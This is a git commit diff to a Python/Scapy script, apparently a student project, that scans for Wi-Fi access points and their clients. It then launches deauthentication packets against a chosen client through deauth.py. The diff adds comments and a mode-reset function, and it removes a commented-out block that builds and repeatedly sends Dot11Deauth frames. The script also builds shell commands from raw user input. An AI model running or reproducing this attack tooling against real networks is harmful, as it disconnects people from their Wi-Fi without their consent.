2fed9d28fe82fa09afe3bcdb6140dce177cc0cf5
tomsuad <tomsuad7@gmail.com>
2020-09-02 18:05:30 +0300

    commit from kali

--- Part_1/first_part.py
+++ Part_1/first_part.py
@@ -12,7 +12,7 @@ ESSID = 0
 BSSID = 1
 CHANNEL = 2
 
-target_mac = ""
+ap_mac = ""
 ap_list = []
 client_list = []
 ssids_set = set()
@@ -41,7 +41,19 @@ GR = '\033[37m' # gray
 T  = '\033[93m' # tan
 
 
-#Done
+##############################################
+############### Interface mode ###############
+##############################################
+
+
+
+#**********************************************#
+#*************** Interface mode ***************#
+#**********************************************#
+
+
+# In this function the user choose the interface that will scan the network and send the deauthentication packets. #
+# In order to do so, we need to switched this interface to 'monitor mode'. #
 def monitor_mode():
     global interface
     print(G + "Step 1:  Choosing an interface to put in 'monitor mode' \n")
@@ -55,14 +67,30 @@ def monitor_mode():
     os.system('ifconfig ' + interface + ' up')
     # os.system('iwconfig') #check
 
-#Done 
+# After we finish our attack, we want to switch back the interface to 'managed mode'. #
+def managed_mode():
+    print(G + "\nStep 5: Reset the interface mode. \n")
+    empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........\n")
+    print(W)
+    os.system('ifconfig ' + interface + ' down')
+    os.system('iwconfig ' + interface + ' mode managed')
+    os.system('ifconfig ' + interface + ' up')
+    print(R + "[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
+    os.system('iwconfig')
+
+
+
+
+# Shell function for 'wifi_scan()'. #
 def ap_scan():
     print(G + "Step 2: Scanning the network for AP to attack. \n")
     empty = input ("Press Enter to continue.........\n")
     # os.system ('airodump-ng ' + interface)
     wifi_scan()
 
-#Done
+
+# In this fucntion we scan the network for nearby access points. #
+# We present to the user all the APs that were found, and he choose which AP he want to attack. #
 def wifi_scan():
     global search_timeout
     search_timeout = int(input(G + "Please enter the scanning time frame in seconds:"))
@@ -72,7 +100,8 @@ def wifi_scan():
     print("\n Scanning for networks...\n")
     sniff(iface=interface, prn=scan_netwroks, timeout=search_timeout)
     num = len(ap_list)
-    if num > 0: # has available networks
+    if num > 0: 
+        # If at least 1 AP was found. #
         print("\n*************** APs Table ***************\n")
         for x in range(num):
             print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID]) 
@@ -84,14 +113,18 @@ def wifi_scan():
         print("bssid:", ap_list[result][BSSID])
         set_channel(int(ap_list[result][CHANNEL]))
         scan_clients(ap_list[result][BSSID], ap_list[result][ESSID])
-    else: # didn't found
+    else: 
+        # If no AP was found. #
         rescan = input("No networks were found. Do you want to rescan? [Y/N] \n")
         if rescan == "Y":
             wifi_scan()
         else:
             print("#  Sorry :(  #")
 
-#Done
+
+# In order to scan the network for multiple APs we need to check with each channel in the range [1,14]. #
+# Usually routers will use the 2.4GHz band with a total of 14 channels.#
+# (In reality it may be 13 or even less that are used around the world.) #
 def change_channel():
     ch = 1
     while True:
@@ -100,30 +133,35 @@ def change_channel():
         ch = ch % 14 + 1
         time.sleep(0.5)
 
-#Done
+
+# After the user choose the AP he want to attack, we want to set the interface's channel to the same channel as the choosen AP. #
 def set_channel(channel):
     os.system('iwconfig %s channel %d' % (interface, channel))
 
-#Done
+
+# sniff(..., prn = scan_netwroks, ...) #
+# The argument 'prn' allows us to pass a function that executes with each packet sniffed. #
+# The intended purpose of this function (scan_netwroks(pkt)) is to control how the packet prints out in the console, and allowing us to replace the default packet printing display with a format of your choice. #
 def scan_netwroks(pkt):
     if pkt.haslayer(Dot11Beacon):
-        # extract the MAC address of the network
+        # Get the BSSID (MAC ADDR) of the AP
         bssid = pkt[Dot11].addr2
-        # get the name of it
+        # Get the ESSID (name) of the AP
         ssid = pkt[Dot11Elt].info.decode()
         if ssid not in ssids_set:
             ssids_set.add(ssid)
             stats = pkt[Dot11Beacon].network_stats()
-            # get the channel of the AP
+            # Get the channel of the AP
             channel = stats.get("channel")
             ap_list.append([ssid, bssid, channel])
             # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (ssid, bssid, channel))
             # print ("BSSID: %s,\t Channel: %d, \t AP name: %s." %(bssid,channel, ssid))
 
+
 #Done
 def scan_clients(rmac, addr):
-    global target_mac
-    target_mac = rmac #ap_mac
+    global ap_mac
+    ap_mac = rmac #ap_mac
     time = search_timeout * 2
     print("\nScanning for clients")
 #    print("\nScanning for clinets:" ,rmac, "\tessid:" , addr ,  "\nscanning time:", time, "sec\n\nscanning...\n")
@@ -141,48 +179,20 @@ def scan_clients(rmac, addr):
     elif result == 'q':
         return
     elif result.isnumeric():
-        deauth_attack(int(result), target_mac)
+        deauth_attack(int(result), ap_mac)
     else:
         return
 
 #Done
 def only_clients(pkt):
     global client_list
-    if (pkt.addr2 == target_mac or pkt.addr3 == target_mac) and \
+    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and \
             pkt.addr1 != "ff:ff:ff:ff:ff:ff":
         if pkt.addr1 not in client_list:
             if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                 client_list.append(pkt.addr1)
                 print("Client mac:", pkt.addr1)
-"""
-def attack(client_idx):
-    print("attacking")
-    # 802.11 frame
-    # addr1: destination MAC
-    # addr2: source MAC
-    # addr3: Access Point MAC
 
-    
-    print("attacking client mac:", client_mac)
-    # print("clinet mac to attack:", client_mac )
-    # brdmac = "ff:ff:ff:ff:ff:ff"
-    # pkt = RadioTap() / Dot11(addr1 = brdmac , addr2 = client_mac , addr3 = client_mac)/ Dot11Deauth()
-    # sendp(pkt, iface=network_adapter , count=1000, inter = 0.2)
-
-    for y in range(1,2):
-        pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
-        pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
-        for _ in range(100):
-            print("sendppp" )
-            sendp(pkt1, iface=network_adapter )
-            sendp(pkt2, iface=network_adapter )
-            if y % 30 == 0:
-                press = input("press p to stop, otherwise any")
-                if press == 'p':
-                    print("#  Goodbye  #")
-                    break
-#    fake_AP(client_mac)
-"""
 
 #Done
 def deauth_attack(client_idx, ap):
@@ -192,17 +202,6 @@ def deauth_attack(client_idx, ap):
     empty = input ("Press Enter to start sending the Deauthentication packets.........\n")
     print(W)
     os.system('python3 deauth.py ' + client_mac + ' ' + ap + ' ' + interface)
-
-
-
-
-
-
-
-
-
-
-
 
 
 def client_scan():
@@ -215,17 +214,6 @@ def client_scan():
     print("\n")
 
 
-
-
-def managed_mode():
-    print(G + "\nStep 5: Reset the interface mode. \n")
-    empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........\n")
-    print(W)
-    os.system('ifconfig ' + interface + ' down')
-    os.system('iwconfig ' + interface + ' mode managed')
-    os.system('ifconfig ' + interface + ' up')
-    print(R + "[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
-    os.system('iwconfig')
 
 
 
